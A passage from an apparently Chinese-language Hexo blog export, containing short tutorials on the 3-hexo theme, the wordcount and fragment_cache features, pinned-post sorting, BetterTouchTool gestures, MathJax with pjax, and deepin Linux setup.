<h3 id="返回头部"><a href="#返回头部" class="headerlink" title="返回头部"></a>返回头部</h3><p><img src="http://img.saodiyang.com/FjpVByJViwYEWHHMTeayiQ-FD_qG.gif" class="lazyload" data-srcset="http://img.saodiyang.com/FjpVByJViwYEWHHMTeayiQ-FD_qG.gif" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="返回头部"></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/yelog/hexo-theme-3-hexo.git themes/3-hexo</span><br></pre></td></tr></table></figure>
<h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h3><p>1） 修改hexo根目录的<code>_config.yml</code>的两处，如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">theme: 3-hexo</span><br><span class="line">highlight:</span><br><span class="line">  enable: false #关闭hexo渲染高亮，使用主题代码块高亮</span><br></pre></td></tr></table></figure>

<p>2） 在hexo 根目录source下添加<code>avatar.jpg</code>文件，作为头像</p>
<ol start="3">
<li>安装字数统计(由于主题使用这个插件，必须安装，否则会报错)<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ $ npm i --save hexo-wordcount</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>注意：</strong> 如果没有安装会在 <code>hexo g</code> 的时候报错</p>
<h3 id="3-更新"><a href="#3-更新" class="headerlink" title="3.更新"></a>3.更新</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> themes/3-hexo</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>3-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo创建404页面</title>
    <url>//hexo-create-404-page</url>
    <content><![CDATA[<p>对于github page来说，只要在根目录又404.html，当页面找不到时，就会被转发到/404.html页面，所以我们只要更改这个页面，就可以实现自定义404页面了。</p>
<p>但是我们通常会需要与本主题相符的404页面。那我们就需要以下操作</p>
<h3 id="新建404页面"><a href="#新建404页面" class="headerlink" title="新建404页面"></a>新建404页面</h3><ol>
<li>进入 Hexo 所在文件夹，输入 <code>hexo new page 404</code> ;</li>
<li>打开刚新建的页面文件，默认在 Hexo 文件夹根目录下 /source/404/index.md；</li>
<li>在顶部插入一行，写上 <code>permalink: /404</code>，这表示指定该页固定链接为 <code>http://&quot;主页&quot;/404.html</code></li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 404</span><br><span class="line">permalink: /404</span><br><span class="line">date: 2016-09-27 11:31:01</span><br><span class="line">---</span><br><span class="line">---</span><br><span class="line">## 页面未找到！</span><br></pre></td></tr></table></figure>

<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><blockquote>
<p><a href="http://yelog.org/%E4%B8%BE%E4%B8%AA404%E4%BE%8B%E5%AD%90">http://yelog.org/举个404例子</a></p>
</blockquote>
<p> <img src="http://img.saodiyang.com/FjSPGVPAu_7d0aMPqErpI1HN_985.png" class="lazyload" data-srcset="http://img.saodiyang.com/FjSPGVPAu_7d0aMPqErpI1HN_985.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="404"></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo加入字数统计WordCount</title>
    <url>//Hexo-WordCount</url>
    <content><![CDATA[<p>只需要安装一个插件 WordCount</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm i hexo-wordcount --save</span><br></pre></td></tr></table></figure>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>单篇文章字数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;%=wordcount(post.content) %&gt;</span><br></pre></td></tr></table></figure>
<p>所有文章的总字数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;%=totalcount(site) %&gt;</span><br></pre></td></tr></table></figure>
<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>2017年3月9日，给3-hexo添加字数统计功能</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo加速渲染速度之fragment_cache</title>
    <url>//hexo-fragment_cache</url>
    <content><![CDATA[<h2 id="前文"><a href="#前文" class="headerlink" title="前文"></a>前文</h2><p>从开发 <code>3-hexo</code> 主题到现在已过去 9 个月时间了，累计在博客中写 132 篇文章了。</p>
<p>现在发现了严重的问题，<code>hexo generate</code> 渲染的速度越来越慢，现在132篇左右，每次渲染时间到达了 50+ s，相当不爽。</p>
<p>今日抽时间，查看了官方api，看到了 <code>fragment_cache</code> 局部缓存这个东西，解决了渲染速度的问题。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h3><p>局部缓存。它储存局部内容，下次使用时就能直接使用缓存。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;%- fragment_cache(id, fn); %&gt;</span><br></pre></td></tr></table></figure>
<h3 id="替换简单文本区域"><a href="#替换简单文本区域" class="headerlink" title="替换简单文本区域"></a>替换简单文本区域</h3><p>a. 我们可以将所有页面都一样的区域，如下所示，缓存下来。当下一篇文章在渲染到这个位置时，将不再渲染，直接拿缓存数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;%- fragment_cache(<span class="string">&#x27;header&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> partial(<span class="string">&#x27;&lt;head&gt;&lt;/head&gt;&#x27;</span>);</span><br><span class="line">&#125;) %&gt;</span><br></pre></td></tr></table></figure>


<p>b. 文章模块也可以使用，原来公共引用部分（没有和当前文章耦合的内容）使用下面的方式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;%- partial(<span class="string">&#x27;_partial/header&#x27;</span>); %&gt;</span><br></pre></td></tr></table></figure>
<p>改进为以下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;%- fragment_cache(<span class="string">&#x27;header&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> partial(<span class="string">&#x27;_partial/header&#x27;</span>);</span><br><span class="line">&#125;) %&gt;</span><br></pre></td></tr></table></figure>

<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这个语法只适用于所有页面都相同，不随文章内容变化的部分。</p>
<p>作者在 <code>3-hexo</code> 中加入了此语法，渲染132篇文章的速度已从 50+s 到现在 3s 左右了。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>fragment_cache</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo置顶及排序问题</title>
    <url>//hexo-top-sort</url>
    <content><![CDATA[<p>近期在写3-hexo主题时，发现文章（<code>site.posts</code>）排序按照.md文件的创建时间排序，而没有按照文章中的date排序。</p>
<p>这就导致了一个问题，我重装了一次电脑，.md文件通过git备份了，还原回来的时候，md的创建时间都是一样的，所以文章列表就按照文章标题排序了</p>
<p>随后就想起了以前使用yilia主题时，设置过置顶文章。所以做了排序，顺便做了置顶的功能。</p>
<blockquote>
<p><strong><a href="http://s.amlove.cn/">@牵猪的松鼠</a>根据这篇文章写了一个npm插件 <a href="https://www.npmjs.com/package/hexo-generator-topindex">hexo-generator-topindex</a><br>安装插件命令： <code>npm install hexo-generator-topindex --save</code><br>如果安装插件，可跳过第一部分 <a href="#%E4%BF%AE%E6%94%B9hexo%E7%9A%84js%E4%BB%A3%E7%A0%81">#修改hexo的js代码</a>，直接看第二部分 <a href="#%E8%AE%BE%E7%BD%AE%E7%BD%AE%E9%A1%B6">#设置置顶</a></strong></p>
</blockquote>
<h2 id="修改hexo的js代码"><a href="#修改hexo的js代码" class="headerlink" title="修改hexo的js代码"></a>修改hexo的js代码</h2><p>直接上操作，修改<code>node_modules/hexo-generator-index/lib/generator.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> pagination = <span class="built_in">require</span>(<span class="string">&#x27;hexo-pagination&#x27;</span>);</span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">locals</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> config = <span class="built_in">this</span>.config;</span><br><span class="line">  <span class="keyword">var</span> posts = locals.posts;</span><br><span class="line">    posts.data = posts.data.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(a.top &amp;&amp; b.top) &#123; <span class="comment">// 两篇文章top都有定义</span></span><br><span class="line">            <span class="keyword">if</span>(a.top == b.top) <span class="keyword">return</span> b.date - a.date; <span class="comment">// 若top值一样则按照文章日期降序排</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> b.top - a.top; <span class="comment">// 否则按照top值降序排</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a.top &amp;&amp; !b.top) &#123; <span class="comment">// 以下是只有一篇文章top有定义，那么将有top的排在前面（这里用异或操作居然不行233）</span></span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!a.top &amp;&amp; b.top) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> b.date - a.date; <span class="comment">// 都没定义按照文章日期降序排</span></span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="keyword">var</span> paginationDir = config.pagination_dir || <span class="string">&#x27;page&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> pagination(<span class="string">&#x27;&#x27;</span>, posts, &#123;</span><br><span class="line">    <span class="attr">perPage</span>: config.index_generator.per_page,</span><br><span class="line">    <span class="attr">layout</span>: [<span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;archive&#x27;</span>],</span><br><span class="line">    <span class="attr">format</span>: paginationDir + <span class="string">&#x27;/%d/&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">      <span class="attr">__index</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="设置置顶"><a href="#设置置顶" class="headerlink" title="设置置顶"></a>设置置顶</h2><p>给需要置顶的文章加入top参数，如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 每天一个linux命令</span><br><span class="line">date: 2017-01-23 11:41:48</span><br><span class="line">top: 1</span><br><span class="line">categories:</span><br><span class="line">- 运维</span><br><span class="line">tags:</span><br><span class="line">- linux命令</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>如果存在多个置顶文章，top后的参数越大，越靠前。</p>
<h2 id="2020-05-20-更新"><a href="#2020-05-20-更新" class="headerlink" title="2020-05-20 更新"></a>2020-05-20 更新</h2><p>3-hexo 主题已经内置排序算法，无需上面下载插件或修改源码，可以直接使用，具体可看 <a href="#">Post not found: 3-hexo-instruction</a> 中的排序相关内容</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>　　Netcan 的 <a href="http://www.netcan666.com/2015/11/22/%E8%A7%A3%E5%86%B3Hexo%E7%BD%AE%E9%A1%B6%E9%97%AE%E9%A2%98/">解决Hexo置顶问题</a></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac神器-BTT(BetterTouchTool)不完全教程</title>
    <url>//Mac-BetterTouchTool</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><img src="http://img.saodiyang.com/Fm6s-GR0yVJgdndJwftdj9eXL7LB.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fm6s-GR0yVJgdndJwftdj9eXL7LB.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="BetterTouchTool"><br>BetterTouchTool 是一款专为Mac用户开发的 窗口管理/<code>Trackpad</code>(触控板)/<code>Magic Mouse</code>(苹果鼠标)/<code>Keyboard</code>(键盘)/<code>TouchBar</code> 功能增强制作的软件。</p>
<p>这款软件不但可以设置全局的 手势/快捷键/TouchBar ，还可以给不同的应用定义不同的姿势，再配合上 Alfred 的 workflow，简直各种高难度姿势都能玩的出来。</p>
<p>本文主要介绍以下功能：</p>
<ol>
<li>窗口管理</li>
<li>帮 Trackpad 定义各种姿势</li>
<li>帮 Magic Mouse 定义各种姿势</li>
<li>帮 Keyboard 定义各种姿势</li>
<li>帮任何应用自定义 TouchBar</li>
</ol>
<p><em>本文以 macbook pro 2017 touchbar 版为例</em></p>
<h2 id="1-窗口管理"><a href="#1-窗口管理" class="headerlink" title="1. 窗口管理"></a>1. 窗口管理</h2><p>这个功能无需过多配置，默认配置即可很好使用（和windows的理念相似）</p>
<ul>
<li>将窗口移到左右边缘，最大化至半屏</li>
<li>将窗口移到上边缘，最大化至全屏</li>
</ul>
<p><img src="http://img.saodiyang.com/lhfTY9ysdWOzOOKprnh0X6MTfoT8.gif" class="lazyload" data-srcset="http://img.saodiyang.com/lhfTY9ysdWOzOOKprnh0X6MTfoT8.gif" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="窗口管理"><br>如果对默认配置不满意，也可以在如下图所示的位置来调整窗口展示：<br><img src="http://img.saodiyang.com/FkluTBqX_n2UXj2ICsOE1tW1yFan.png" class="lazyload" data-srcset="http://img.saodiyang.com/FkluTBqX_n2UXj2ICsOE1tW1yFan.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="窗口管理配置"></p>
<h2 id="2-帮-Trackpad-定义各种姿势"><a href="#2-帮-Trackpad-定义各种姿势" class="headerlink" title="2. 帮 Trackpad 定义各种姿势"></a>2. 帮 Trackpad 定义各种姿势</h2><h3 id="姿势选择"><a href="#姿势选择" class="headerlink" title="姿势选择"></a>姿势选择</h3><p>在界面选择 Trackpad（触摸板） -&gt; Add New Gesture（添加一个新姿势）</p>
<p>左边可以选择生效的范围：全局或者某个应用</p>
<p><img src="http://img.saodiyang.com/FsPEIn9TlNOwHkWHgyD32snaT7bY.jpg" class="lazyload" data-srcset="http://img.saodiyang.com/FsPEIn9TlNOwHkWHgyD32snaT7bY.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="选择触摸板姿势"><br>如上图所示，姿势包括但不限于如：</p>
<ol>
<li>单指：左下角单击、单指轻拍右上角、单指轻拍上边中点</li>
<li>双指：两个手指捏、张开两指以两指中心为圆轴逆时针、中指拍住中央食指轻拍面板、双指从上边缘下滑</li>
<li>三指：三指轻拍、三指拍顶端、三指点击并向上滑、两指轻拍住，拍左、右二指固定拍住，左一下滑</li>
<li>四指：四指双轻拍、中指无名小拍住，食单击、食中指无名拍住，小单击</li>
<li>五指：五手指轻拍、五手指上滑</li>
</ol>
<p>上面只是列一些典型，更多姿势可以在上图中浏览。</p>
<h3 id="绑定功能"><a href="#绑定功能" class="headerlink" title="绑定功能"></a>绑定功能</h3><p><img src="http://img.saodiyang.com/FjNWJgoefc34vGaUhruvWQr2R--5.png" class="lazyload" data-srcset="http://img.saodiyang.com/FjNWJgoefc34vGaUhruvWQr2R--5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="定义姿势功能"></p>
<p>选择过姿势之后，也可以选择在按住某个功能键的时候才能使用（左下角）。</p>
<p>右边是绑定功能：快捷键或动作。</p>
<ul>
<li><p>绑定快捷键举例：<br>比如 给chrome 设置 姿势（两指从触控板下边缘滑入），弹出开发者模式（快捷键绑定：command+option+i），如下图：<br><img src="http://img.saodiyang.com/Fnuaa2qtpdf28autM22l3RPRtCau.jpg" class="lazyload" data-srcset="http://img.saodiyang.com/Fnuaa2qtpdf28autM22l3RPRtCau.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="给chrome设置姿势，弹出开发者模式"></p>
</li>
<li><p>绑定动作举例：<br>设置 在任何应用内，五指下滑 锁屏，如下图<br><img src="http://img.saodiyang.com/FuTHBQJRvDVem9c14G608eXKtR7R.png" class="lazyload" data-srcset="http://img.saodiyang.com/FuTHBQJRvDVem9c14G608eXKtR7R.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="五指下滑锁屏"></p>
</li>
</ul>
<h2 id="3-帮-Magic-Mouse-定义各种姿势"><a href="#3-帮-Magic-Mouse-定义各种姿势" class="headerlink" title="3. 帮 Magic Mouse 定义各种姿势"></a>3. 帮 Magic Mouse 定义各种姿势</h2><p>这个功能设置和 Trackpad 设置 大同小异，所以这边就不多讲，直接图示几个功能。<br><img src="http://img.saodiyang.com/FgwGsolKj59jVnOkgI5vb4zdxNwm.png" class="lazyload" data-srcset="http://img.saodiyang.com/FgwGsolKj59jVnOkgI5vb4zdxNwm.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="两指上滑呼出Mission Control"></p>
<p>我快捷键设置了 option+E 鼠标取词翻译（欧陆词典），然后绑定到双指轻拍鼠标，即可触发翻译。<br><img src="http://img.saodiyang.com/FsuJ3xU8k5ANQkuXdgpy0Xxkhdme.png" class="lazyload" data-srcset="http://img.saodiyang.com/FsuJ3xU8k5ANQkuXdgpy0Xxkhdme.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="双指轻拍-取词翻译"></p>
<h2 id="4-帮-Keyboard-定义各种姿势"><a href="#4-帮-Keyboard-定义各种姿势" class="headerlink" title="4. 帮 Keyboard 定义各种姿势"></a>4. 帮 Keyboard 定义各种姿势</h2><p>这个功能比较简单，设置一些 键盘快捷键或录制案件序列 来触发 一些动作或者其他快捷键功能。</p>
<h2 id="5-帮任何应用自定义-TouchBar"><a href="#5-帮任何应用自定义-TouchBar" class="headerlink" title="5. 帮任何应用自定义 TouchBar"></a>5. 帮任何应用自定义 TouchBar</h2><p>这个重磅功能，可以帮助不支持touchbar的软件定制 TouchBar，是不是有点厉害。</p>
<p>下面就以我给 IntelliJ IDEA 定制 TouchBar 为例 (没有F1 ~ F12 功能键，debug真的很痛苦，这个软件真的是雪中送炭)，展示一下使用效果</p>
<p><img src="http://img.saodiyang.com/Fl0oSr-rNLr3f23_E_ZTlMEo46l1.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fl0oSr-rNLr3f23_E_ZTlMEo46l1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="定制 TouchBar"></p>
<p>如上图所示，我给 IntelliJ IDEA 添加了 四个功能 step over/step into/resume/evaluate</p>
<p>添加完之后，切到 IntelliJ IDEA 软件中时，TouchBar 就显示我们添加的四个功能键， 如下图所示<br><img src="http://img.saodiyang.com/Fi4MOmPsZDPj0Z2UEUxOqCbeIV1o.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fi4MOmPsZDPj0Z2UEUxOqCbeIV1o.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="IntelliJ IDEA 定制 TouchBar"></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>BTT还有其他很方便的功能，这盘就介绍到这里，等之后更新了 Alfred 的 workflow 开发指南之后，再一起更新一篇有意思的 BTT+Alfred 效率流。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>mac</tag>
        <tag>efficiency</tag>
      </tags>
  </entry>
  <entry>
    <title>MathJax适配Pjax</title>
    <url>//MathJax-pjax</url>
    <content><![CDATA[<p>hexo 添加 MathJax 的过程网上很多，这里就不细讲，这里贴一张写的不错的文章 <a href="http://masikkk.com/article/hexo-13-MathJax/">Hexo博客(13)添加MathJax数学公式渲染</a></p>
<p>由于 <code>3-hexo</code> 这个主题使用了 <code>pjax</code> ，刷新和第一次加载没有问题，但是点到其他文章，再点回来，渲染就无效了。</p>
<p>这个问题和之前适配多说和高亮时，是同样的问题，只需要在下面配置即可。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).on(&#123;</span><br><span class="line">    <span class="comment">/*pjax请求回来页面后触发的事件*/</span></span><br><span class="line">    <span class="string">&#x27;pjax:end&#x27;</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">/*渲染MathJax数学公式*/</span></span><br><span class="line">        $.getScript(<span class="string">&#x27;//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML&#x27;</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            MathJax.Hub.Typeset();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这样就解决了pjax的适配问题。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>mathjax</tag>
        <tag>pjax</tag>
      </tags>
  </entry>
  <entry>
    <title>deepin系统使用记录</title>
    <url>//deepin-linux</url>
    <content><![CDATA[<h2 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h2><ul>
<li><a href="https://www.deepin.org/">官网</a></li>
<li><a href="https://bbs.deepin.org/">论坛</a></li>
<li><a href="https://wiki.deepin.org/">deepin’wiki</a></li>
<li><a href="https://wiki.deepin.org/index.php?title=Deepin%E5%BA%94%E7%94%A8%E7%AE%A1%E7%90%86">Deepin应用列表</a></li>
</ul>
<h2 id="输入法"><a href="#输入法" class="headerlink" title="输入法"></a>输入法</h2><p>安装输入法，除了商店下载（好多输入法没有被收录进deepin商店），可以使用fcitx安装。<br>如安装google拼音输入法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo aptitude install fcitx fcitx-googlepinyin</span><br></pre></td></tr></table></figure>
<p>如果当前在使用ibus，而不是fcitx的话，看下面<br>1）安装fcitx，并安装google拼音</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install fcitx fcitx-googlepinyin im-config</span><br></pre></td></tr></table></figure>
<p>2）打开输入法配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ im-config</span><br></pre></td></tr></table></figure>
<p>依次：<code>ok</code>-&gt;<code>yes</code>,选择fcitx为默认输入法框架,<code>ok</code>-&gt;<code>ok</code></p>
<h2 id="制作启动器图标"><a href="#制作启动器图标" class="headerlink" title="制作启动器图标"></a>制作启动器图标</h2><p>以创建 <code>atom</code> 这款编辑器的启动器图标为例。<br>1）进入 <code>/usr/share/applications/</code> 目录，创建 <code>atom.desktop</code> 文件<br>2）编辑 <code>atom.desktop</code> 文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Name=Atom</span><br><span class="line">Comment=A hackable text editor for the 21st century</span><br><span class="line">Exec=/opt/atom/atom %F</span><br><span class="line">Icon=/opt/atom/atom.png</span><br><span class="line">Type=Application</span><br><span class="line">StartupNotify=true</span><br><span class="line">Categories=TextEditor;Development;Utility;</span><br><span class="line">MimeType=text/plain;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>解释：<br><code>Name</code>：创建的图标名称<br><code>Comment</code>：备注，随便填<br><code>Exec</code>：启动文件的位置<br><code>Icon</code>：图标位置<br><code>Type</code>：类型，启动程序就填Application<br><code>StartupNotify</code>: 启动通知，填true就行了。详细可查 <a href="https://developer.gnome.org/integration-guide/stable/startup-notification.html.en">Startup notification</a><br><code>Categories</code>： 分类，随便填，比如：Application;<br><code>MimeType</code>： 打开文件类型</p>
</blockquote>
<h2 id="修改apt源"><a href="#修改apt源" class="headerlink" title="修改apt源"></a>修改apt源</h2><p>修改 <code>/etc/apt/sources.list</code><br>默认的源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb [by-hash=force] http://packages.deepin.com/deepin/ unstable main contrib non-free</span><br></pre></td></tr></table></figure>
<p>阿里云的源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb [by-hash=force] http://mirrors.aliyun.com/deepin unstable main contrib non-free</span><br></pre></td></tr></table></figure>


